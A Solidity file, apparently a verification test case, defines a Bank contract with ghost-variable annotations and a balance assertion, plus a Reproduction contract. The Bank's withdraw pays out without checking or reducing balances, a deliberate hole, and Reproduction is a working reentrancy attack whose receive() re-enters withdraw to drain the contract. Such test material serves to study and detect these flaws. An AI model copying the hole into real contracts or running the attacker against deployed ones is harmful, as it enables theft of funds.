// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.5.0;

interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Bank is IBank {
    mapping(address => uint) balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) public {
        require(amount > 0);
        /// @custom:preghost function withdraw
        uint old_contract_balance = address(this).balance;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        /// @custom:postghost function withdraw
        uint new_contract_balance = address(this).balance;
        assert(new_contract_balance == old_contract_balance - amount);
    }
}

contract Reproduction {
    Bank public target;

    constructor(address _target) {
        target = Bank(_target);
    }
    function setup() external payable {
        require(msg.value > 0);
        target.deposit{value: msg.value}();
    }

    function trigger(uint amount) external {
        target.withdraw(amount);
    }

    receive() external payable {
        target.withdraw(msg.value);
    }
}
